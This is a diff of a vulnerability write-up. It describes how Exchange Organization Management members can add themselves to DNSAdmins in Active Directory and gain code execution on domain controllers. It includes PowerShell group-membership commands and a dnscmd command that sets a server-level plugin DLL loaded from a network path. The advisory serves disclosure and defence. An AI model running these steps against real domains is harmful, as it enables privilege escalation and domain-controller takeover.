@@ -11,7 +11,7 @@ However, the DACL of the incriminated object on their side appears to be quite d
 
 
 From there, I can only speculate that either they have an unreleased fix on their testing environments, or their path of Exchange deployment on AD is different
-from what is commonly observed on live domains, which are upgraded and not redeployed on CU releases.
+from what is commonly observed on live domains, which are upgraded and not redeployed on CU releases. If the aformentionned *Deny* ACEs are positioned on your environment, it is probably *NOT* vulnerable.
 
 
 * Description of the issue
@@ -19,10 +19,14 @@ from what is commonly observed on live domains, which are upgraded and not redep
 In up-to-date deployments of Exchange 2016 in Shared permissions (default) or RBAC split permissions, three controlling ACEs are positioned on the "CN=DNSAdmins,CN=Users" group for the **Exchange Windows Permissions** 
 and for the **Exchange Trusted Subsystem** security groups.
 
-These ACE are probably positioned during an update or a particular CU install. I have been confirmed they exist on other organizations production environments.
+These ACE are probably positioned during an update or a particular CU install. I have been confirmed they exist on other organizations production environments. This is their SDDL representation:
 
-If the aformentionned *Deny* ACEs are positioned on your environment, it is probably *NOT* vulnerable.
-
+```
+(OA;CIID;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;<SID of EWP>)
+(OA;CIID;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;<SID of EWP>)
+(OA;CIID;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;<SID of ETS>)
+```
+Which translates into:
 
 | Account | ACE type | Inheritance | Permissions | On property/ Applies to | Comments |
 | ------- | -------- | ----------- | ----------- | ----------------------- | -------- |
@@ -50,8 +54,7 @@ Any member of the Organization Management group can execute code remotely on the
 
 * Proof of concept
 
-1)
-From an Organization Management member account, add yourself to Exchange Windows Permissions
+1) From an Organization Management member account, add yourself to Exchange Windows Permissions
 This is possible by default and normal
 
 ```
@@ -60,11 +63,9 @@ $user = Get-ADUser -Identity $id.User
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user
 ```
 
-2)
-LOG OUT AND RELOG THE USERS SESSION to update groups in token
+2) LOG OUT AND RELOG THE USERS SESSION to update groups in token
 
-3)
-Add yourself to DNSAdmins
+3) Add yourself to DNSAdmins
 This is the problem, it should not be possible
 
 ```
@@ -73,11 +74,9 @@ $user = Get-ADUser -Identity $id.User
 Add-ADGroupMember -Identity "DNSAdmins" -Members $user
 ```
 
-4)
-LOG OUT AND RELOG THE USERS SESSION to update groups in token
+4) LOG OUT AND RELOG THE USERS SESSION to update groups in token
 
-5)
-Choose a domain controller and remotely change a registry key to load a dll (needs specific exports) on next DNS service restart:
+5) Choose a domain controller and remotely change a registry key to load a dll (needs specific exports) on next DNS service restart:
 
 ```
 dnscmd test_domain_controller /config /serverlevelplugindll \\NetworkPath\to\dll
